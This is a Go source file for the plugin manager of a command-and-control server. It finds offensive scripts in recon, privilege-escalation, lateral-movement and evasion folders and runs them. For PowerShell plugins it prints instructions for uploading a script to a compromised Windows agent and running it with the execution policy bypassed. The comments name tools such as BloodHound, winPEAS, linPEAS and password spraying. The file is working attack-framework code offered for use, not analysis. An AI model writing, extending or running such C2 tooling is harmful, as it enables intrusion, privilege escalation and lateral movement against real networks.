package server

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
)

// ══════════════════════════════════════════
//  PLUGIN SYSTEM
// ══════════════════════════════════════════
// Plugins are external scripts/binaries in the plugins/ directory.
// They're executed with agent context and can extend C2 functionality
// without modifying core code.
//
// Plugin types:
//   - .py   — Python scripts (executed with python3)
//   - .ps1  — PowerShell scripts (uploaded and executed on agent)
//   - .sh   — Bash scripts (executed on C2 or uploaded to agent)
//   - .go   — Go plugins (compiled and loaded)
//
// Directory structure:
//   plugins/
//     recon/
//       enum_shares.py
//       bloodhound_collector.ps1
//     privesc/
//       winpeas.ps1
//       linpeas.sh
//     lateral/
//       spray.py

// PluginManager manages loaded plugins.
type PluginManager struct {
	mu      sync.RWMutex
	plugins map[string]*Plugin
	baseDir string
}

// Plugin represents a loadable plugin.
type Plugin struct {
	Name        string `json:"name"`
	Category    string `json:"category"`
	Path        string `json:"path"`
	Type        string `json:"type"` // py, ps1, sh, go
	Description string `json:"description"`
	Author      string `json:"author"`
}

// NewPluginManager creates a plugin manager and scans the plugins directory.
func NewPluginManager(baseDir string) *PluginManager {
	pm := &PluginManager{
		plugins: make(map[string]*Plugin),
		baseDir: baseDir,
	}
	pm.Scan()
	return pm
}

// Scan discovers plugins in the plugins directory.
func (pm *PluginManager) Scan() {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	pm.plugins = make(map[string]*Plugin)

	// Create plugins dir if not exists
	os.MkdirAll(pm.baseDir, 0755)
	os.MkdirAll(filepath.Join(pm.baseDir, "recon"), 0755)
	os.MkdirAll(filepath.Join(pm.baseDir, "privesc"), 0755)
	os.MkdirAll(filepath.Join(pm.baseDir, "lateral"), 0755)
	os.MkdirAll(filepath.Join(pm.baseDir, "post"), 0755)
	os.MkdirAll(filepath.Join(pm.baseDir, "evasion"), 0755)

	filepath.Walk(pm.baseDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		if ext != ".py" && ext != ".ps1" && ext != ".sh" && ext != ".go" {
			return nil
		}

		rel, _ := filepath.Rel(pm.baseDir, path)
		parts := strings.SplitN(rel, string(os.PathSeparator), 2)
		category := "general"
		if len(parts) > 1 {
			category = parts[0]
		}

		name := strings.TrimSuffix(filepath.Base(path), ext)
		pm.plugins[name] = &Plugin{
			Name:     name,
			Category: category,
			Path:     path,
			Type:     ext[1:], // Remove the dot
		}
		return nil
	})
}

// List returns all loaded plugins.
func (pm *PluginManager) List() []*Plugin {
	pm.mu.RLock()
	defer pm.mu.RUnlock()

	var result []*Plugin
	for _, p := range pm.plugins {
		result = append(result, p)
	}
	return result
}

// Execute runs a plugin on the C2 server side.
func (pm *PluginManager) Execute(name string, args []string) (string, error) {
	pm.mu.RLock()
	plugin, ok := pm.plugins[name]
	pm.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("plugin '%s' not found. Run 'plugins list' to see available plugins", name)
	}

	var cmd *exec.Cmd
	switch plugin.Type {
	case "py":
		cmd = exec.Command("python3", append([]string{plugin.Path}, args...)...)
	case "sh":
		cmd = exec.Command("bash", append([]string{plugin.Path}, args...)...)
	case "ps1":
		// PowerShell plugins are meant to be uploaded to agents, not run on C2
		content, err := os.ReadFile(plugin.Path)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("[*] PowerShell plugin '%s' (%d bytes)\n[*] Upload to agent and execute:\n  upload %s C:\\Users\\Public\\%s.ps1\n  shell powershell -ep bypass -f C:\\Users\\Public\\%s.ps1",
			name, len(content), plugin.Path, name, name), nil
	default:
		return "", fmt.Errorf("unsupported plugin type: %s", plugin.Type)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), err
	}
	return string(out), nil
}

// GetContent reads a plugin file for uploading to agents.
func (pm *PluginManager) GetContent(name string) ([]byte, error) {
	pm.mu.RLock()
	plugin, ok := pm.plugins[name]
	pm.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("plugin '%s' not found", name)
	}
	return os.ReadFile(plugin.Path)
}
